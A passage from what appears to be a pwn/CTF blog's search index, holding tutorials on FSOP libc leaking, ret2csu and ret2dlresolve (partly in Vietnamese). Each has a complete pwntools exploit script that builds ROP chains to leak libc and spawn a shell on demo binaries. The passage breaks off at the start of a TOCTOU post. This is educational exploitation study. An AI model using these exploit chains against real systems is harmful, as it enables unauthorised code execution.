__write\n- `puts` → `__IO_puts` → `_IO_new_file_xsputn` **→** `_IO_new_file_overflow` → `_IO_do_write`\n- `_IO_do_write` → `_IO_new_do_write` → `new_do_write`\n- finally it will call `_IO_SYSWRITE(f, f→_IO_write_base, f→_IO_write_ptr - f→_IO_write_base)`\n    \n    → output `stdout→_IO_write_base` with length of `f→_IO_write_ptr - f→_IO_write_base` to stdout\n    \n\n**To-do :** \n\n- need to bypass 2 if statements in `_IO_new_file_overflow`:\n    1. first : \n        \n        ```c\n         if (f->_flags & _IO_NO_WRITES)\n        ```\n        \n        → _flags ≠ `_IO_NO_WRITES` (0x0008)\n        \n    2. second :\n        \n        ```c\n          if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)\n        ```\n        \n        → flags = `_IO_CURRENTLY_PUTTING` (0x800) or  `_IO_write_base` ≠ NULL\n        \n- bypass another if statements in `new_do_write` :\n    \n    ```c\n    if (fp->_flags & _IO_IS_APPENDING)\n    ```\n    \n    → _flag = `_IO_IS_APPENDING` (0x1000)\n    \n## How to leak libc\n1. overwrite `_flag` to `0xfbad1800`\n2. overwrite `_IO_read_ptr`, ` _IO_read_end`, `_IO_read_base`, `_IO_write_base` to the ptr that have an address we want to leak\n3. overwrite `_IO_write_ptr`, `_IO_write_end`, `_IO_buf_base`, `_IO_buf_end` to `ptr + x` (it will leak x byte). That ptr must in read and writable address.\n4. call puts -> leak.\n\n## DEMO balsn babypwn 2023\n\nWe are given a simple binary \n\n![](https://hackmd.io/_uploads/B1qTwTLWT.png)\n\n![](https://hackmd.io/_uploads/Byi0waU-T.png)\n\nBut we dont have pop rdi gadget\n\n![](https://hackmd.io/_uploads/rJV-_6Uba.png)\n\nWe cannot do ret2dlresolve due to Full Relro. ret2csu is also impossible to do. So we will do some special techniques. After that ctf end, people mostly solved it in three ways :\n- bruteforce libc by using one_gadget (LMAO)\n- use add eax gadget to point eax to the area that have libc address then call puts to leak libc.\n- use fsop\n\nI will use fsop in this exploit.\n\nWe will do that in three part : \n- Stack pivot to bss \n- Overwrite the stdout ptr in the bss by using FSOP\n- Leak libc -> ret2syscall \n\n### Stack pivot to bss:\n\nThis is just a very simple process. Note that i use a very high address (bss + 0x400)\n\n```python  \npayload = b'a'*32+p64(exe.bss()+0x400 + 0x20)+p64(exe.sym['main']+42)\nsl(payload)\n\npayload = b'a'*32+p64(0x404200+0x20)+p64(exe.sym['main']+42)\nsl(payload)\n```    \n### FSOP\n\nThis is the hard part. The big question in this step is how to overwrite the stdout ptr. My idea is use the `leave, ret` gadget. \n\nEX : rsp = a , rbp = b (b is point to c). Now when we call `leave, ret` it will become rsp = b+8, rbp = c.\n\nUsing the above example, we can utilize it to make the rbp point to that stdout ptr. But here is one big problem : the stdout ptr is store in `0x404010` which is the beginning of the bss. So when we call `gets` it will get sigsegv because libc will push something to our bss() and at some point it will go to some uninitialized address.  \n\nSo how to bypass it ?. This make me stuck for a very long time. After all, i realised when call `puts` (with our rsp is now point to bss) the bss will have stdout address !. By using stack cached we can bypass the above problem (using another address not 0x404010). \n\n![](https://hackmd.io/_uploads/SJ3ApaLZp.png)\n\n\nAnother problem is when we do the `leave, ret` to overwrite the new stdout ptr `addr1` , our rsp ptr will now point to `addr1 + 8` and will look for address to return. So before overwrite that new ptr, we must overwrite `addr1 + 8` to point to some useful ropchain in our program.\n\nMore problem appear !!!. After we overwrite that ptr, and puts leak the libc. The leave, ret instruction will execute again ! and will make our rsp point to some location in the libc (writable of course) so we must also overwrite it to new ropchain. In order to do that and not overwrite the vtable, we must partial overwrite lower address of `addr1` to `\\x00` \n\n\nNow we can fsop by : \n1. overwrite `_flag` to `0xfbad1800`\n2. overwrite `_IO_read_ptr`, ` _IO_read_end`, `_IO_read_base`, `_IO_write_base` to got table (any function you like)\n3. overwrite `_IO_write_ptr`, `_IO_write_end`, `_IO_buf_base`, `_IO_buf_end` to `ptr` (that `ptr` must be the bss to make it writable )\n4. call puts -> leak.\n### ret2syscall\n\nThis is the final step, and with the libc we can easily get shell\n\n```python!\npoprdi = libc.address + 0x000000000002a3e5\npoprsi = libc.address + 0x000000000002be51\npoprdx = libc.address + 0x00000000000796a2\npoprax = libc.address + 0x0000000000045eb0\nsyscall = libc.address + 0x0000000000029db4\npayload = b'a'*32+b'b'*8+p64(poprdi)+p64(next(libc.search(b'/bin/sh\\x00')))\npayload += p64(poprsi)+p64(0)+p64(poprdx)+p64(0)+p64(poprax)+p64(0x3b)+p64(syscall)\nsl(payload)\n```\n\n### Recap\n1. Stack pivot to bss \n2. Read again in the bss , puts to make the bss have the new stdout `ptr1`\n3. overwrite the lower address of that `ptr1` to `\\x00`\n4. overwrite `ptr1+8` to ropchain\n5. return to the above ropchain, now we can fsop stdout\n6. fsop stdout and ropchain in here\n7. return to bss and do ret2syscall\n8. get shell\n\n\nScript : \n```python!\nimport sys\nfrom pwn import *\ncontext.binary = exe = ELF(\"chall_patched\")\nlibc = ELF(\"libc.so.6\")\nif (args.REMOTE):\n        p = remote()\nelse :\n        p = process(exe.path)\n\nsla = lambda msg, data: p.sendlineafter(msg, data)\nsa = lambda msg, data: p.sendafter(msg, data)\nsl = lambda data: p.sendline(data)\ns = lambda data: p.send(data)\n\nif (args.GDB):\n        gdb.attach(p,\n        \"\"\"\n        b*0x00000000004011bb\n        b*0x00000000004011c6\n        c\n        \"\"\")\n        input()\n\npoprbp = 0x000000000040115d\nleave = 0x00000000004011c5\naddrsp = 0x0000000000401016\nret = 0x000000000040101a\n\nfake_file = p64(0xfbad1800)+p64(0x403fe8)*4+p64(exe.bss()+0x50)*4\n\npayload = b'a'*32+p64(exe.bss()+0x400 + 0x20)+p64(exe.sym['main']+42)\nsl(payload)\n\npayload = b'a'*32+p64(0x404200+0x20)+p64(exe.sym['main']+42)\nsl(payload)\n\npayload = b'a'*32+p64(0x404340+8+0x20)+p64(exe.sym['main']+42)\nsl(payload)\n\npayload = b'a'*32+p64(0x404378+8+0x20)+p64(exe.sym['main']+42)\nsl(payload)\n\npayload = p64(0x4011a0)*4 + p64(0x404378) + p64(leave)\nsl(payload)\n\npayload = b'\\x00'*32 + p64(exe.bss()+0x100) + p64(exe.sym['main']+42)+b'\\x00'*112+ fake_file\nsl(payload)\nfor i in range(0,5):\n        p.recvline()\nleak = u64(p.recvn(8))\nlibc.address = leak - libc.sym['setvbuf']\nprint(\"leak : \",hex(leak))\nprint(\"base : \",hex(libc.address))\n\npoprdi = libc.address + 0x000000000002a3e5\npoprsi = libc.address + 0x000000000002be51\npoprdx = libc.address + 0x00000000000796a2\npoprax = libc.address + 0x0000000000045eb0\nsyscall = libc.address + 0x0000000000029db4\n\npayload = b'a'*32+b'b'*8+p64(poprdi)+p64(next(libc.search(b'/bin/sh\\x00')))\npayload += p64(poprsi)+p64(0)+p64(poprdx)+p64(0)+p64(poprax)+p64(0x3b)+p64(syscall)\nsl(payload)\np.interactive()\n```\n![](https://hackmd.io/_uploads/rkKwGRIZa.png)\n\n\n## Credit \n1. https://ctftime.org/writeup/34812\n2. https://rninche01.tistory.com/entry/stdout-flag%EB%A5%BC-%EC%9D%B4%EC%9A%A9%ED%95%9C-libc-leak?category=838537\n\n\n","tags":["fsop"],"categories":["pwn"]},{"title":"ret2csu","url":"/2023/08/22/ret2csu/","content":"\n# ret2csu - alternative way to bypass ASLR\n\nret2csu là kỹ thuật được sử dụng khi ta không có đầy đủ gadget cần thiết để thực hiện rop chain. Đây chính là gadget luôn có khi compile dynamic một binary. Bài này mình sẽ giới thiệu về kỹ thuật này thông qua một challenge.\n\n## Tổng quát\nKhi chạy chương trình, không chỉ có các đoạn code của ta được thực thì mà còn có các đoạn code mặc định được thêm vào. Những đoạn code này nhằm mục đích khởi tạo các giá trị môi trường, load thông tin về những phần được thực thi cũng như \"huỷ\" nó khi kết thúc chương trình.\n\n![](https://hackmd.io/_uploads/rJYR97M6h.png)\n\nĐây là thứ tự chương trình chạy khi trace từ entry point và ở đây ta cần chú ý đến hàm `__libc_csu_init`.\n\nKhi ta disass hàm này thì có một vài gadget thú vị\n```\ngef➤  disass __libc_csu_init\nDump of assembler code for function __libc_csu_init:\n   0x00000000004011b0 <+0>:     endbr64\n   0x00000000004011b4 <+4>:     push   r15\n   0x00000000004011b6 <+6>:     lea    r15,[rip+0x2c53]        # 0x403e10\n   0x00000000004011bd <+13>:    push   r14\n   0x00000000004011bf <+15>:    mov    r14,rdx\n   0x00000000004011c2 <+18>:    push   r13\n   0x00000000004011c4 <+20>:    mov    r13,rsi\n   0x00000000004011c7 <+23>:    push   r12\n   0x00000000004011c9 <+25>:    mov    r12d,edi\n   0x00000000004011cc <+28>:    push   rbp\n   0x00000000004011cd <+29>:    lea    rbp,[rip+0x2c44]        # 0x403e18\n   0x00000000004011d4 <+36>:    push   rbx\n   0x00000000004011d5 <+37>:    sub    rbp,r15\n   0x00000000004011d8 <+40>:    sub    rsp,0x8\n   0x00000000004011dc <+44>:    call   0x401000 <_init>\n   0x00000000004011e1 <+49>:    sar    rbp,0x3\n   0x00000000004011e5 <+53>:    je     0x401206 <__libc_csu_init+86>\n   0x00000000004011e7 <+55>:    xor    ebx,ebx\n   0x00000000004011e9 <+57>:    nop    DWORD PTR [rax+0x0]\n   0x00000000004011f0 <+64>:    mov    rdx,r14\n   0x00000000004011f3 <+67>:    mov    rsi,r13\n   0x00000000004011f6 <+70>:    mov    edi,r12d\n   0x00000000004011f9 <+73>:    call   QWORD PTR [r15+rbx*8]\n   0x00000000004011fd <+77>:    add    rbx,0x1\n   0x0000000000401201 <+81>:    cmp    rbp,rbx\n   0x0000000000401204 <+84>:    jne    0x4011f0 <__libc_csu_init+64>\n   0x0000000000401206 <+86>:    add    rsp,0x8\n   0x000000000040120a <+90>:    pop    rbx\n   0x000000000040120b <+91>:    pop    rbp\n   0x000000000040120c <+92>:    pop    r12\n   0x000000000040120e <+94>:    pop    r13\n   0x0000000000401210 <+96>:    pop    r14\n   0x0000000000401212 <+98>:    pop    r15\n   0x0000000000401214 <+100>:   ret\nEnd of assembler dump.\n```\n\n![](https://hackmd.io/_uploads/HJifCXGTn.png)\n\nMình lần lượt lable 2 gadget này như trên ảnh. Ở đây ta nhận thấy rằng ta có thể điều khiển được một vài register và bằng việc chain gadget1 -> gadget2 thì ta có thể call được địa chỉ mà ta muốn\n\n![](https://hackmd.io/_uploads/B1WaRXzph.png)\n\n## Exploit\n\nDo tính bá đạo của nó vì có mặt ở hầu hết các binary nên đã được xoá từ glibc 2.34\n\n![](https://hackmd.io/_uploads/HkNJlNGp2.png)\nhttps://sourceware.org/legacy-ml/libc-alpha/2018-06/msg00717.html\n\nĐây là thông tin tóm tắt về một số giá trị của register\n\n![](https://hackmd.io/_uploads/Bka-P4fa3.png)\n\nDo sau đó nó sẽ gọi `call qword [r15 + rbx*8]` nên để đơn giản ta cho `rbx = 0` để khỏi tính toán \nNgoài ra ta để ý rằng nếu ta chain gadget 1 -> gadget2 thì nếu ta cho các register đúng như các giá trị của ảnh trên thì nó sẽ thực thi lại gadget1 vì các lệnh sau:\n```asm\n    add    rbx,0x1\n    cmp    rbp,rbx\n    jne    0x4011f0 <__libc_csu_init+64>\n```\n\nDo đó ta hoàn toàn có thể loop lại chương trình để tiếp tục gọi đến nó.\n\nLưu ý: \n- Chỉ khai thác được với các binary được combile dynamic với glibc <= 2.33\n- `r15+rbx*8` phải chứa địa chỉ trỏ đến địa chỉ ta muốn call\n\n## Demo time\n\nỞ đây ta có một [file](https://github.com/Hellsender01/Youtube/blob/main/Binary%20Exploitation/B.%20Ret2CSU/ret2csu) binary\n\n![](https://hackmd.io/_uploads/SyBmXNfa2.png)\n\nDễ dàng thấy được đây có lỗi bof\n\n![](https://hackmd.io/_uploads/H1gPmNGah.png)\n\nỞ đây mình sẽ giải bài này theo kiểu ret2csu.\n\n![](https://hackmd.io/_uploads/BJGh4EGp2.png)\n\nVào ida ta thấy có hàm `__libc_csu_init` là biết được ta có thể sài kỹ thuật này. \n\nTiếp theo vào gdb tìm địa chỉ của gadget 1 và 2\n\n![](https://hackmd.io/_uploads/rJzir4MTn.png)\n\n```python=\npart1 = 0x000000000040120a\npart2 = 0x00000000004011f0\nret = 0x000000000040101a\n```\n\nHướng khai thác lúc này của ta như sau:\n- leak libc\n- overwrite 1 địa chỉ bss bằng execve (bằng 1-lý-do-nào-đó mà mình sài system không được)\n- overwrite 1 địa chỉ bss bằng `/bin/sh`. Ở đây ta không thể sài địa chỉ `/bin/sh` ở libc được vì nó hơn 4 byte (vì ta chỉ có thể control edi)\n- gọi địa chỉ bss mà ta overwrite\n- profit\n-> tất cả các quá trình trên đều thực hiện bằng ret2csu\n\nĐầu tiên ta leak libc:\n```python=\npayload = b'a'*56+ p64(part1)\npayload += p64(0)+p64(1)+p64(1)+p64(exe.got['write'])+p64(8)+p64(exe.got['write'])\npayload += p64(part2)\npayload += p64(0)*7 +p64(exe.sym['vuln'])\np.send(payload)\n\np.recvuntil(b'Enter Data - ')\nleak =u64(p.recvn(8))\nlibc.address = leak - 1014464\nprint(\"LEAK \" , hex(libc.address))\n```\nỞ đây mình leak địa chỉ của write. Ta để ý rằng có \n```python\np64(0)*7 +p64(exe.sym['vuln'])\n```\nDo nó sẽ thực thi lại gadget1 nên ta cần 6 cái p64 để fill 6 cái register, 1 còn lại cái là padding. Sau đó nó lại tiếp tục chạy về hàm `vuln`\n\nTa thực hiện tương tự để overwrite bss thành `execve`\n\n```python=\npayload =b'a'*56 + p64(part1)\npayload += p64(0)+p64(1)+p64(0)+p64(exe.bss())+p64(8)+p64(exe.got['read'])\npayload += p64(part2)\npayload += p64(0)*7 + p64(exe.sym['vuln'])\np.send(payload)\ntime.sleep(1)\np.send(p64(libc.sym['execve']))\n```\nTiếp theo là ghi `/bin/sh`\n```python=\npayload =b'a'*56 + p64(part1)\npayload += p64(0)+p64(1)+p64(0)+p64(exe.bss()+0x20)+p64(8)+p64(exe.got['read'])\npayload += p64(part2)\npayload += p64(0)*7 + p64(exe.sym['vuln'])\np.send(payload)\ntime.sleep(1)\np.send(b'/bin/sh\\x00')\n```\nCuối cùng là gọi lại bss để lấy shell.\n```python=\npayload = b'a'*56+p64(part1)\npayload += p64(0)+p64(1)+p64(exe.bss()+0x20) +p64(0)*2+p64(exe.bss())\npayload += p64(part2)\n```\nPhần này ta thấy là không cần quay lại vuln làm gì nên không cần fill lại register\n\nChạy thử thì ta có shell\n![](https://hackmd.io/_uploads/Bk90qVfa2.png)\n\nFull script \n```python=\nfrom pwn import *\nimport time\nexe = ELF(\"ret2csu\")\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\np = process(exe.path)\n\npart1 = 0x000000000040120a\npart2 = 0x00000000004011f0\nret = 0x000000000040101a\n\npayload = b'a'*56+ p64(part1)\npayload += p64(0)+p64(1)+p64(1)+p64(exe.got['write'])+p64(8)+p64(exe.got['write'])\npayload += p64(part2)\npayload += p64(0)*7 +p64(exe.sym['vuln'])\np.send(payload)\n\np.recvuntil(b'Enter Data - ')\nleak =u64(p.recvn(8))\nlibc.address = leak - 1014464\nprint(\"LEAK \" , hex(libc.address))\n\npayload =b'a'*56 + p64(part1)\npayload += p64(0)+p64(1)+p64(0)+p64(exe.bss())+p64(8)+p64(exe.got['read'])\npayload += p64(part2)\npayload += p64(0)*7 + p64(exe.sym['vuln'])\np.send(payload)\ntime.sleep(1)\np.send(p64(libc.sym['execve']))\n\nprint(\"BSS \",hex(exe.bss()))\n\npayload =b'a'*56 + p64(part1)\npayload += p64(0)+p64(1)+p64(0)+p64(exe.bss()+0x20)+p64(8)+p64(exe.got['read'])\npayload += p64(part2)\npayload += p64(0)*7 + p64(exe.sym['vuln'])\np.send(payload)\ntime.sleep(1)\np.send(b'/bin/sh\\x00')\n\npayload = b'a'*56+p64(part1)\npayload += p64(0)+p64(1)+p64(exe.bss()+0x20) +p64(0)*2+p64(exe.bss())\npayload += p64(part2)\n\np.send(payload)\np.interactive()\n```\n\n> **Nhận xét:** Dù ở đây glibc mình đang sài là bản 2.37 nhưng vẫn exploit được do binary này được compile ở bản mà __libc_csu_init vẫn còn khả dụng \n\n## References\n1. https://ir0nstone.gitbook.io/notes/types/stack/32-vs-64-bit\n2. https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf\n3. https://gist.github.com/kaftejiman/a853ccb659fc3633aa1e61a9e26266e9","tags":["linux"],"categories":["pwn","stack overflow"]},{"title":"ret2dlresolve note","url":"/2023/07/30/ret2dlresolve/","content":"Trong một số trường hợp khi ta overflow mà không có các hàm trong PLT thích hợp để leak libc ra thì ret2dl_resolve là một kỹ thuật để lấy được shell. Trong bài này mình sẽ giới thiệu tóm tắt về cách ret2dl_resolve ở glibc 2.37 hoạt động qua một bài demo.\n\n## Prerequisites :\nDo nếu mình giải thích chi tiết từng dòng code chạy sau thì nó rất rất dài và giống như reinvent the wheel nên các bạn có thể đọc trước ở đây:\n- [syst3mfailure](https://syst3mfailure.io/ret2dl_resolve/) - Phân tích chi tiết từng dòng \n- [phrack article ở mục 5](http://phrack.org/issues/58/4.html) - bài original public về kỹ thuật này \n- [ricardo2197](https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62) - Bài khá hay tóm tắt về nó\n- [file](https://www.da.vidbuchanan.co.uk/blog/static/babystack.tar.gz) binary mình demo\n\n## Overview\nKỹ thuật này lợi dụng việc lazy binding tức quá trình resolve symbol ở runtime không có bound check từ đó ta khiến nó overwrite địa chỉ GOT của một hàm nào đó thành `system`\n\n![](https://hackmd.io/_uploads/rJeZGIMi3.png)\n\nKhi ta gọi hàm `read` thì những việc sau đây xảy ra :\n\n1. Nhảy vào .plt của `read` \n2. jmp vào một địa chỉ trong `.got.plt`. \n3. Nếu địa chỉ này chưa resolve thì nó sẽ trỏ ngược lại vào địa chỉ tiếp theo cần thực hiện trong `.plt`. Nếu resolve rồi thì thực hiện nó\n4. Nếu chưa resolve thì bước này là bước đi resolve\n\nTrong quá trình đi resolve nó sẽ push 2 arguments lên stack : `linkmap` và `reloc_arg`.\n- `linkmap` là chỗ chứa các địa chỉ ở bên dưới - ở đây ta không quan tâm về nó\n![](https://hackmd.io/_uploads/By-vOLMsn.png)\n- `reloc_arg` dùng để tính offset mà ta cần cực kỳ để ý.\n\nMục tiêu của ret2dl_resolve như sau:\n- Fake argument `reloc_arg` \n- Fake 3 chunk STRTAB, SYMTAB,JMPREL\n\nĐể fake đúng ta cần tính offset **chuẩn** . 3 chunk ta fake thường nằm ở heap hoặc bss của binary. Đây là địa chỉ mà ta phải có control hoàn toàn.\nLưu ý : địa sym và SYMTAB, reloc và JMPREL mà mình đề cập bên dưới là các địa chỉ khác nhau hoàn toàn.\n\n## Details:\n### STRTAB\n\n```clike=\ngef➤  x/10s 0x804822c\n0x804822c:      \"\"\n0x804822d:      \"libc.so.6\"\n0x8048237:      \"_IO_stdin_used\"\n0x8048246:      \"read\"\n0x804824b:      \"alarm\"\n0x8048251:      \"__libc_start_main\"\n0x8048263:      \"__gmon_start__\"\n0x8048272:      \"GLIBC_2.0\"\n0x804827c:      \"\"\n0x804827d:      \"\"\n```\n\nSTRTAB chỉ là nơi chứa strings. Mục tiêu của ta khi fake nó chỉ là ghi `system\\x00` (null terminated str) vào một địa chỉ\n\n### SYMTAB\n\nMột chunk sym được định nghĩa như sau:\n- Ở x64\n```clike=\ntypedef struct\n{\n  Elf64_Word\tst_name;\t\t/* Symbol name (string tbl index) */\n  unsigned char\tst_info;\t\t/* Symbol type and binding */\n  unsigned char st_other;\t\t/* Symbol visibility */\n  Elf64_Section\tst_shndx;\t\t/* Section index */\n  Elf64_Addr\tst_value;\t\t/* Symbol value */\n  Elf64_Xword\tst_size;\t\t/* Symbol size */\n} Elf64_Sym;\n```\n- Ở x32\n```clike=\ntypedef struct\n{\n  Elf32_Word\tst_name;\t\t/* Symbol name (string tbl index) */\n  Elf32_Addr\tst_value;\t\t/* Symbol value */\n  Elf32_Word\tst_size;\t\t/* Symbol size */\n  unsigned char\tst_info;\t\t/* Symbol type and binding */\n  unsigned char\tst_other;\t\t/* Symbol visibility */\n  Elf32_Section\tst_shndx;\t\t/* Section index */\n} Elf32_Sym;\n```\n\nCách mà source tính ra chunk này : \n```clike=\nconst ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)]\n// which is the same as :\nconst ElfW(Sym) *sym = &symtab[(reloc->r_info) >> 8]\n// also the same as :\n*sym = SYMTAB + index *sizeof(sym)\n// index = (reloc->r_info) >> 8\n\n----------------------------------------------\nconst ElfW(Sym) *const symtab\n    = (const void *) D_PTR (l, l_info[DT_SYMTAB])\n                      --------SYMTAB--------\n```\n\nx64 và x32 chỉ khác mỗi size còn lại tương tự\n\n![](https://hackmd.io/_uploads/HkdIp8zoh.png)\n\nỞ đây chúng ta chỉ quan tâm đến `st_other` và `st_name`\n- `st_other` : bắt buộc = 0\n- `st_name` : chứa offset đến string `system` mà ta fake\n\n### JMPREL\n\nMột chunk reloc được định nghĩa như sau : \n- x32\n```c=\n\ntypedef struct\n{\n  Elf32_Addr\tr_offset;\t\t/* Address */\n  Elf32_Word\tr_info;\t\t\t/* Relocation type and symbol index */\n} Elf32_Rel;\n```\n\n- x64\n```c=\ntypedef struct\n{\n  Elf64_Addr\tr_offset;\t\t/* Address */\n  Elf64_Xword\tr_info;\t\t\t/* Relocation type and symbol index */\n} Elf64_Rel;\n```\nCách mà source tính ra chunk này:\n```c=\nconst PLTREL *const reloc = (const void *) (D_PTR(l, l_info[DT_JMPREL]) + reloc_offset);\n// the same as\nreloc = JMPREL + reloc_offset\n// such that\nreloc_offset = reloc_arg //x32\nreloc_offset = reloc_arg *0x18 //x64\n```\n\n![](https://hackmd.io/_uploads/SJWzMvGo3.png)\n\n\n## But howww ???\n### Basic algorithm (true case)\nTrong trường hợp thoả mãn tất cả điều kiện thì nó sẽ resolve bằng thuật toán sau\n1. push `reloc_arg`, `linkmap`\n2. get `SYMTAB` address\n3. get `STRTAB` address\n4. get a ptr to `ELF32_Rela` / `ELF64_Rela` struct\n5. get a ptr to `ELF32_Sym` / `ELF64_Sym` struct (base on a ptr in step 4)\n6. check `r_info` ending with 0x7 \n7. check `st_other == 0` or not\n8. do some stuff to check the version\n9. get the address from glibc base on `STRTAB + st_name`\n\n### Observation:\n1. Ta không thể fake `SYMTAB`, `STRTAB` , `linkmap` (hmmm có thể có nhưng kỹ thuật khá khó)\n2. Bước 4 tính ptr đó bằng công thức:  `reloc = JMPREL + reloc_arg` \n3. Bước 5 tính ptr đó bằng công thức `sym = SYMTAB + (r_info >> 8) * sizeof(sym)`\n\n### Các bước tính:\n1. Tìm 3 địa chỉ `addr1` , `addr2` ,`addr3` mà chúng ta có quyền control\n2. Fake ELF32_Rela / ELF64_Rela `addr1` struct\n- reloc_arg = `addr1`  - JMPREL **(x32)**\n- reloc_arg = (`addr1`  - JMPREL) / 24 **(x64)**\n-  r_info = (((`addr2` - SYMTAB) / sizeof(sym)) << 8) | 7\n- `addr1` chunk : [GOT,  r_info]\n3. Fake ELF32_Sym / ELF64_Sym `addr2` struct :\n- st_name = `addr3` - STRTAB\n- st_value, st_size, st_info, st_other, st_shndx = 0\n4. write `system` to `addr3`\n\nTrong quá trình fake thì các chunk đấy phải nằm đúng một ô nhớ 4 byte hoặc 8 byte ở một địa chỉ -> align khi thấy không phù hợp\n\n## Demo\nĐầu tiên ta chạy lệnh này để note lại các giá trị \n```c!\n$ readelf -d babystack\n\nDynamic section at offset 0xf14 contains 24 entries:\n  Tag        Type                         Name/Value\n 0x00000001 (NEEDED)                     Shared library: [libc.so.6]\n 0x0000000c (INIT)                       0x80482c8\n 0x0000000d (FINI)                       0x80484f4\n 0x00000019 (INIT_ARRAY)                 0x8049f08\n 0x0000001b (INIT_ARRAYSZ)               4 (bytes)\n 0x0000001a (FINI_ARRAY)                 0x8049f0c\n 0x0000001c (FINI_ARRAYSZ)               4 (bytes)\n 0x6ffffef5 (GNU_HASH)                   0x80481ac\n 0x00000005 (STRTAB)                     0x804822c\n 0x00000006 (SYMTAB)                     0x80481cc\n 0x0000000a (STRSZ)                      80 (bytes)\n 0x0000000b (SYMENT)                     16 (bytes)\n 0x00000015 (DEBUG)                      0x0\n 0x00000003 (PLTGOT)                     0x804a000\n 0x00000002 (PLTRELSZ)                   24 (bytes)\n 0x00000014 (PLTREL)                     REL\n 0x00000017 (JMPREL)                     0x80482b0\n 0x00000011 (REL)                        0x80482a8\n 0x00000012 (RELSZ)                      8 (bytes)\n 0x00000013 (RELENT)                     8 (bytes)\n 0x6ffffffe (VERNEED)                    0x8048288\n 0x6fffffff (VERNEEDNUM)                 1\n 0x6ffffff0 (VERSYM)                     0x804827c\n 0x00000000 (NULL)                       0x0\n```\n\nNote lại\n```python!\nSYMTAB = 0x080481cc\nSTRTAB = 0x0804822c\nJMPREL = 0x080482b0\n```\n\nVào ida thì ta dễ dàng thấy rằng bị bof\n\n![](https://hackmd.io/_uploads/BkDp5tGj3.png)\n\nVào gdb thì thấy rằng không có hàm nào thích hợp để giúp ta leak libc -> ret2dl_resolve\n\n![](https://hackmd.io/_uploads/ByYZotfoh.png)\n\nSau một hồi test với binary thì thấy rằng ta cần pivot stack vào bss() do arguments 1 tức `reloc_arg` cần phải ở đầu stack\n\nQuá trình pivot stack cũng như làm sau để bof 1 file x32 sẽ không trình bày ở đây\n\n```python=\naddr1 = 0x804af00\npayload = b'a'*40 + p32(addr1)\n\npayload +=  p32(exe.plt['read']) + p32(0x8048455)+  p32(0) + p32(addr1) + p32(0x80)\np.send(payload)\n```\n\nTrong đó `0x8048455` là gadget `leave_ret`. Ở đây chúng ta thực hiện ghi 2 lần. \n- Lần 1 tức payload trên để pivot stack\n- Lần 2 gửi payload ret2dl_resolve lên bss()\n\nPayload 2 của mình có dạng sau\n\n![](https://hackmd.io/_uploads/HJUdgcMi2.png)\n\n\n```python=\naddr1 += 0x14\nreloc_args = (addr1 - JMPREL)\naddr2 = 0x804af1c\nsuccess(\"FAKE ELF32_SYM addr2 : \" + hex(addr2))\nr_info = (addr2- SYMTAB) // 16\nr_info = (r_info <<8) | 0x7\n\nsuccess(\"FAKE ELF32_RELA addr1 : \" + hex(addr1))\nsuccess(\"CACULATED reloc_args: \" + hex(reloc_args))\nsuccess(\"r_info : \" + hex(r_info))\n\nstring = 0x0804af2c - STRTAB\n```\n\nDo `addr1` sau khi chạy payload 1 đang là `rsp`\nnên mình cộng thêm 0x14 tức chỗ để fake `ELF32_Rela` struct.\n\n`string` trong code trên là `st_name` fake\n\nPayload sau khi gửi \n\n![](https://hackmd.io/_uploads/S1i7M9Min.png)\n\nTa có thể thấy là các địa chỉ ta fake nằm trọn trong 1 ô vùng nhớ. Các địa chỉ khác tính như công thức mình đưa ra ở trên .\n\nChỗ padding này như sau\n\n![](https://hackmd.io/_uploads/rJbymqMon.png)\n\n\n- `0x804af08` là esp tức là `reloc_arg`\n- 2 địa chỉ tiếp theo là phần padding. Ở đây mình gửi string `sh` và tiếp theo mình gửi vào `0x804af10` địa chỉ trỏ tới `sh`. Lý do của việc đó là vì khi ta thực hiện resolve xong thì nó sẽ thực hiện hàm `system` đấy. Do là x32 nên theo calling convention thì nó expect arguments ở `esp+0x8`\n\nTa chạy script thì lấy được shell\n\n![](https://hackmd.io/_uploads/BySV4qzoh.png)\n\n\nFull script : \n```python=\nfrom pwn import *\nimport time\nexe = ELF(\"babystack\")\np = process(exe.path)\n\nSYMTAB = 0x080481cc\nSTRTAB = 0x0804822c\nJMPREL = 0x080482b0\n\nGOT = 0x804a010\nret = 0x080482d2\n\naddr1 = 0x804af00\npayload = b'a'*40 + p32(addr1)\n\npayload +=  p32(exe.plt['read']) + p32(0x8048455)+  p32(0) + p32(addr1) + p32(0x80)\np.send(payload)\n\ntime.sleep(1)\n\naddr1 += 0x14\nreloc_args = (addr1 - JMPREL)\nsuccess(\"FAKE ELF32_RELA addr1 : \" + hex(addr1))\nsuccess(\"CACULATED reloc_args: \" + hex(reloc_args))\naddr2 = 0x804af1c\nsuccess(\"FAKE ELF32_SYM addr2 : \" + hex(addr2))\nr_info = (addr2- SYMTAB) // 16\nr_info = (r_info <<8) | 0x7\nsuccess(\"r_info : \" + hex(r_info))\n\nstring = 0x0804af2c - STRTAB\npayload = b'a'*4 + p32(0x80482F0) + p32(reloc_args) + b'sh\\x00\\x00'+p32(0x0804af0c)\npayload += p32(exe.got['read']) + p32(r_info)+p32(string)+p32(0)*3+b'system\\x00'\np.send(payload)\n\np.interactive()\n```\n\n## References\n1. [syst3mfailure](https://syst3mfailure.io/ret2dl_resolve/)\n2. [phrack article ở mục 5](http://phrack.org/issues/58/4.html)\n3. [ricardo2197](https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62) ","tags":["linux"],"categories":["pwn","stack overflow"]},{"title":"TOCTOU attack","url":"/2023/07/04/toctou/","content":"Trong bài này mình sẽ giới thiệu qua về TOCTOU (time of check - time of use), một hướng khai thác trong race condition cũng như cách setup đơn giản để khai thác và giải một số bài minh hoạ. \n\n## Giới thiệu\nRace condition là một lỗi xảy ra khi thực hiện một loạt các context switch giữa một process này với một process khác nhưng các process đấy lại xảy ra mâu thuẫn với nhau. TOCTOU là một dạng trong số các mâu thuẫn đấy và xảy ra khi chương trình check một điều kiện nào đó trước khi thực hiện công việc bất kỳ nhưng khi thực hiện context switch thì điều kiện đấy sẽ không còn đúng nữa và sẽ cho phép dẫn tới privilege escalation hoặc đọc ghi file ngoài ý muốn.\n\n### Nguyên nhân\nNguyên nhân chính của việc dẫn đến race condition là do máy tính cho phép thực 